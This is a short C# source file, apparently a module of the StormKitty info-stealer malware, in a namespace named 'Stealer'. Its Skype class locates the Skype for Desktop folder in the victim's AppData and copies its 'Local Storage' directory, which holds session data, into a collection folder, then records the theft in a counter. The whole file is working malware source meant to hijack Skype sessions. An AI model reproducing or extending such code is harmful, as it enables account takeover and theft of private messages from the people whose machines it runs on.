using System.IO;

namespace Stealer
{
    internal sealed class Skype
    {
        private static readonly string SkypePath = Path.Combine(Paths.appdata, "Microsoft\\Skype for Desktop");

        // Copy Local State directory
        public static void GetSession(string sSavePath)
        {
            if (!Directory.Exists(SkypePath))
                return;

            string local_storage = Path.Combine(SkypePath, "Local Storage");
            if (Directory.Exists(local_storage))
                try
                {
                    StormKitty.Filemanager.CopyDirectory(local_storage, sSavePath + "\\Local Storage");
                } catch { return; }

            Counter.Skype = true;
        }
    }
}
